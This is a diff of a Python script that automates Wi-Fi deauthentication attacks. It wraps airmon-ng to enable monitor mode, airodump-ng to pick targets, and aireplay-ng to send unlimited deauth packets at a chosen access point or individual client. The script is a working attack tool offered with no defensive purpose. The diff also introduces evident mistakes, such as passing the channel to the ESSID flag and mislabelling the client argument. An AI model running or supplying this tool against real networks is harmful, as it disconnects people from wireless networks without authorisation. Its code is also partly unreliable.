@@ -4,9 +4,7 @@ import time
 import csv
 import sys
 from pathlib import Path
-
 OUTPUT_FILE = "/tmp/airodump_full_output"
-
 def check_req():
 	try:
 		result = subprocess.run(["which", "aircrack-ng"], capture_output=True, text=True)
@@ -24,7 +22,7 @@ def check_req():
 	except Exception as e:
 		print(f"An error occurred while checking for aircrack-ng: {e}")
 		sys.exit(1)
-	
+
 def validate_monitor_mode(interface):
 	result = subprocess.run(["iwconfig"], capture_output=True, text=True)
 	if f"{interface}mon" in result.stdout:
@@ -48,25 +46,35 @@ def cleanup(airodump_pid, mon_interface):
 		print(f"Removing output file {OUTPUT_FILE}-01.csv...")
 		os.remove(f"{OUTPUT_FILE}-01.csv")
 
+def startup(interface):
+	print("Killing interfering processes...")
+	os.system("sudo airmon-ng check kill")
+	
+	print(f"\nStarting monitor mode on {interface}...")
+	os.system(f"sudo airmon-ng start {interface}")
+	
+	mon_interface = validate_monitor_mode(interface)
+	if not mon_interface:
+		return
+	else:
+		return mon_interface
+
 def kill(airodump_pid):
 	print("\nKilling...")
 	print(f"Stopping airodump-ng (PID {airodump_pid})...")
 	os.kill(airodump_pid, 9)
-
 def display_table(file_path):
 	try:
+		os.system('clear')
 		with open(file_path, 'r') as f:
-			os.system('clear')
 			reader = csv.reader(f)
 			rows = list(reader)
 			if len(rows) < 2:
 				sys.stdout.write("No data available yet.\n")
 				sys.stdout.flush()
 				return
-			
 			tables = []
 			current_table = []
-			
 			for row in rows:
 				if all(cell.strip() == '' for cell in row):
 					if current_table:
@@ -94,78 +102,67 @@ def display_table(file_path):
 	except Exception as e:
 		sys.stdout.write(f"An error occurred while displaying the table: {e}\n")
 		sys.stdout.flush()
-
 def deauth_ap(bssid, channel):
 	print(f"Deauthenticating AP {bssid} on channel {channel}...")
 	airodump_command = [
-		"sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, "--ignore-negative-one"
+		"sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, "-e", channel
 	]
 	command_str = " ".join(airodump_command)
 	print(f"Executing {command_str}")
-	
+	airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+	airodump_pid = airodump_proc.pid
+	print(f"airodump-ng started with PID {airodump_pid}")
 	try:
-		airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-		airodump_pid = airodump_proc.pid
-		print(f"aireplay-ng started with PID {airodump_pid}")
-		
-		stdout, stderr = airodump_proc.communicate(timeout=10)  # Timeout after 10 seconds
+		stdout, stderr = airodump_proc.communicate(timeout=10)  # Timeout after 10 seconds (adjust as needed)
 		print("\n--- Command Output ---")
-		print(stdout.decode())
+		print(stdout)
 		if stderr.strip():
 			print("\n--- Command Errors ---")
-			print(stderr.decode())
+			print(stderr)
 	except subprocess.TimeoutExpired:
 		print("\nCommand is taking too long. You can stop it manually.")
-		airodump_proc.terminate()  # Terminate process if it times out
 	except Exception as e:
 		print(f"\nAn error occurred while executing the command: {e}")
-	
 	while True:
-		a = input("Type STOP to kill it, (k or 1 or stop or s) or press Enter to continue...").lower()
+		a = input("Type STOP to kill it, (k or 1 or stop or s ) or enter to continue...").lower()
 		if a in ("s", "k", "1", "stop"):
-			try:
-				airodump_proc.terminate()
-				print("Process terminated.")
-			except Exception as e:
-				print(f"Failed to terminate process: {e}")
+			kill(airodump_pid)
 			break
-
-
-def deauth_client(bssid, channel, client):
-	print(f"Deauthenticating client {clients} on AP {bssid} at channel {channel}...")
+def deauth_client(bssid, channel,essid, mon_interface):
+	print(f"Deauthenticating client {essid} on AP {bssid} at channel {channel}...")
 	airodump_command = [
-		"sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, "-c", client, "--ignore-negative-one"
+		"sudo", "airodump-ng","--bssid", bssid, "--channel", channel, mon_interface
+	]
+	airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+	airodump_pid = airodump_proc.pid
+	print(f"switching to channel {channel}...")
+	time.sleep(4)
+	print("killing airedump channel switching... switching to deauth protocol...")
+	kill(airodump_pid)
+	airodump_command = [
+		"sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, "-c" ,essid , mon_interface
 	]
 	command_str = " ".join(airodump_command)
 	print(f"Executing {command_str}")
-	
+	airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+	airodump_pid = airodump_proc.pid
+	print(f"airodump-ng started with PID {airodump_pid}")
 	try:
-		airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-		airodump_pid = airodump_proc.pid
-		print(f"aireplay-ng started with PID {airodump_pid}")
-		
-		stdout, stderr = airodump_proc.communicate(timeout=10)  # Timeout after 10 seconds
+		stdout, stderr = airodump_proc.communicate(timeout=10)  # Timeout after 10 seconds (adjust as needed)
 		print("\n--- Command Output ---")
-		print(stdout.decode())
+		print(stdout)
 		if stderr.strip():
 			print("\n--- Command Errors ---")
-			print(stderr.decode())
+			print(stderr)
 	except subprocess.TimeoutExpired:
 		print("\nCommand is taking too long. You can stop it manually.")
-		airodump_proc.terminate()  # Terminate process if it times out
 	except Exception as e:
 		print(f"\nAn error occurred while executing the command: {e}")
-	
 	a = input("Type STOP to kill it, (k or 1 or stop or s ) or enter to continue...").lower()
 	if a in ("s", "k", "1", "stop"):
-		try:
-			airodump_proc.terminate()
-		except Exception as e:
-			print(f"Failed to terminate process: {e}")
+		kill(airodump_pid)
 		return 0
-
-
-def fun():
+def fun(mon_interface):
 	while True:
 		try:
 			bssid = input("Your chosen BSSID: ")
@@ -178,9 +175,7 @@ def fun():
 					print(f"Removing output file {OUTPUT_FILE}-01.csv...")
 					os.remove(f"{OUTPUT_FILE}-01.csv")
 				airodump_command = [
-					"sudo", "airodump-ng", "--manufacturer", "--beacons", "--band", "abg", 
-					"--bssid", bssid, "--channel", channel, 
-					mon_interface, "--write", OUTPUT_FILE, "--output-format", "csv"
+					"sudo", "airodump-ng", "--manufacturer", "--beacons", "--band", "abg", "--bssid", bssid, "--channel", channel, mon_interface, "--write", OUTPUT_FILE, "--output-format", "csv"
 				]
 				print(f"Executing {airodump_command}")
 				airodump_proc = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -193,11 +188,9 @@ def fun():
 				while not Path(f"{OUTPUT_FILE}-01.csv").exists() and retries < 20:
 					time.sleep(1)
 					retries += 1
-
 				if not Path(f"{OUTPUT_FILE}-01.csv").exists():
 					print(f"Error: Output file {OUTPUT_FILE}-01.csv not found. Exiting.")
 					return
-
 				print("Displaying live data...")
 				while True:
 					if display_table(f"{OUTPUT_FILE}-01.csv") == 0:
@@ -214,7 +207,7 @@ def fun():
 			if a in ("yes","y", "1"):
 				essid = input("essid: ")
 				while True:
-					if deauth_client(bssid, channel,essid) == 0:
+					if deauth_client(bssid, channel,essid,mon_interface) == 0:
 						os.kill(airodump_pid, 9)
 						break
 				command_str = " ".join(airodump_command)
@@ -225,26 +218,16 @@ def fun():
 			print(f"Error occurred: {e}")
 		finally:
 			kill(airodump_pid)
-
 def main():
 	airodump_pid = None
 	mon_interface = None
-
 	try:
 		interface = input("Enter the network interface (e.g., wlan0): ").strip()
 		
 		a = input("airodump or directly jump into aireplay (1 or 2): ").lower()
 		if a in ("1"):
 			try:
-				print("Killing interfering processes...")
-				os.system("sudo airmon-ng check kill")
-				
-				print(f"\nStarting monitor mode on {interface}...")
-				os.system(f"sudo airmon-ng start {interface}")
-				
-				mon_interface = validate_monitor_mode(interface)
-				if not mon_interface:
-					return
+				mon_interface = startup(interface)
 					
 				if Path(OUTPUT_FILE).exists():
 					os.remove(OUTPUT_FILE)
@@ -263,7 +246,6 @@ def main():
 				while not Path(f"{OUTPUT_FILE}-01.csv").exists() and retries < 20:
 					time.sleep(1)
 					retries += 1
-
 				if not Path(f"{OUTPUT_FILE}-01.csv").exists():
 					print(f"Error: Output file {OUTPUT_FILE}-01.csv not found. Exiting.")
 					return
@@ -274,22 +256,21 @@ def main():
 						break
 						os.kill(airodump_pid, 9)  # Sending SIGKILL to terminate the process
 				print(f"Killed {airodump_command} command")
+				fun(mon_interface)
 			except Exception as e:
 				print(f"Error has occurred {e} \nquitting...")
 			finally:
 				kill(airodump_pid)
-			fun()
 		elif a in ("2"):
-			fun()
+			mon_interface = startup(interface)
+			fun(mon_interface)
 			
-
 	except KeyboardInterrupt:
 		print("\nExiting on user request.")
 	except Exception as e:
 		print(f"An error occurred: {e}")
 	finally:
 		cleanup(airodump_pid, mon_interface)
-
 if __name__ == "__main__":
 	check_req()
 	main()
